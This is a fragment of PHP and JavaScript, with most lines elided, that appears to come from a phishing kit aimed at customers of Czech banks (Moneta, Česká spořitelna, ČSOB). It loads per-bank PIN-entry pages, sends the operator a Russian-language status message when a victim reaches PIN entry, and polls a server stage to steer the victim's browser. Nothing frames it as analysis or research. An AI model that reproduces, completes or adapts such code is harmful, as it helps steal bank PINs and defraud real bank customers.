...
if ($dbconn) {
  ...
  if ($result) {
      ...
      $currStageText = '🗝Переход на ввод PIN <b>' . $bank_name . '</b>';
...
switch ($bank) {
    case 'moneta':
        include 'moneta/monetapin.php';
        break;
    case 'sporitelna':
        include 'sporitelna/CeskaPIN.php';
        break;
    case 'csob': 
      include 'csob/csobpin.php';
      break;
    default:
    ...
    function checkStage() {
        $.ajax({
            ...
            success: function (stage) {
                ...
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'pin' && stage != '') {
                    console.log(stage)
